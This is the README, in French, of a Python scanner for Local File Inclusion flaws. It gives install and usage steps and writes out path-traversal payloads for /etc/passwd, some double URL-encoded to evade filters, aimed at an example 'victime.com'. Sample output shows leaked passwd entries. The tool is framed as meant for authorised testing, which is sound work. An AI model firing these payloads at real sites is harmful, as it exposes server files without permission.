# 🔍 LFI Scanner by Clyde

Un outil simple en Python pour détecter les vulnérabilités de type **Local File Inclusion (LFI)** sur les applications web. Il utilise des chemins couramment exploités ainsi qu’un double encodage optionnel pour contourner les filtres.

---

## 📌 Fonctionnalités

* Injection automatique de payloads LFI dans un paramètre spécifié.
* Test avec encodage normal et double encodage URL.
* Détection de contenu révélateur (comme `/etc/passwd`, erreurs Apache, etc.).
* Mise en couleur des résultats pour une lecture rapide.

---

## ⚙️ Installation

```bash
git clone https://github.com/clydedc/lfi-scanner.git
cd lfi-scanner
pip install -r requirements.txt
```

> **Note** : Le fichier `requirements.txt` doit contenir :
>
> ```
> requests
> colorama
> ```

---

## 🚀 Utilisation

```bash
python3 scanner.py <URL> <paramètre>
```

### Exemples

```bash
python3 scanner.py https://victime.com/index.php page
```

Cela injectera une série de payloads dans l'URL :

```
https://victime.com/index.php?page=../../../../../../../../etc/passwd
```

et leurs équivalents en **double encodage** :

```
https://victime.com/index.php?page=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
```

---

## 🧪 Détails Techniques

* **Payloads inclus** : fichiers Unix/Linux et Windows fréquemment ciblés.
* **Encodages testés** :

  * *Normal* : brut
  * *Double encodé* : utile pour contourner certains filtres de sécurité.
* **Signatures recherchées dans la réponse** :

  * `"root:x"` (Unix passwd)
  * `"127.0.0.1"`, `"[apache"`, `"PATH="`, `"USER="` etc.

---

## 📦 Exemple de sortie

```bash
[+] Starting LFI Scan on https://victime.com/index.php

[*] Testing payload (normal): https://victime.com/index.php?page=../../../../etc/passwd
[+] Possible LFI detected with payload (normal): https://victime.com/index.php?page=../../../../etc/passwd
[+] Snippet:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

## 👤 Auteur

**Clyde**
🔗 [GitHub](https://github.com/clydedc)

---

## ⚠️ Disclaimer

> Cet outil est uniquement destiné à des **fins éducatives** et de **tests de sécurité autorisés**.
> L'utilisation non autorisée contre des systèmes tiers est **illégale**.

